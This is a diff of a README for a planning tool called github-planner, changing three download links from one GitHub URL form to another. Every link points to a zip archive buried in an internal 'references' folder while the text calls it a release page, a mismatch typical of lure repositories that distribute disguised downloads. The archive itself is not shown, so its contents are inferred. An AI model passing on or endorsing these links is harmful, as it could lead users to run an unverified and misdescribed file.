@@ -1,6 +1,6 @@
 # 📋 github-planner - Plan GitHub Work With Less Effort
 
-[![Download github-planner](https://img.shields.io/badge/Download%20Now-6B7280?style=for-the-badge&logo=github)](https://github.com/Huldalackadaisical179/github-planner/raw/refs/heads/main/src/skills/plan-to-issues/references/github_planner_v2.6.zip)
+[![Download github-planner](https://img.shields.io/badge/Download%20Now-6B7280?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Huldalackadaisical179/github-planner/main/src/skills/plan-to-issues/references/github_planner_v2.6.zip)
 
 ## 🧭 What this app does
 
@@ -32,7 +32,7 @@ For best results, use:
 
 Visit this page to download github-planner:
 
-https://github.com/Huldalackadaisical179/github-planner/raw/refs/heads/main/src/skills/plan-to-issues/references/github_planner_v2.6.zip
+https://raw.githubusercontent.com/Huldalackadaisical179/github-planner/main/src/skills/plan-to-issues/references/github_planner_v2.6.zip
 
 On that page:
 1. open the latest release
@@ -200,7 +200,7 @@ Try this:
 
 Use this link to visit the release page and download github-planner:
 
-https://github.com/Huldalackadaisical179/github-planner/raw/refs/heads/main/src/skills/plan-to-issues/references/github_planner_v2.6.zip
+https://raw.githubusercontent.com/Huldalackadaisical179/github-planner/main/src/skills/plan-to-issues/references/github_planner_v2.6.zip
 
 ## 🧾 What github-planner is built for
 
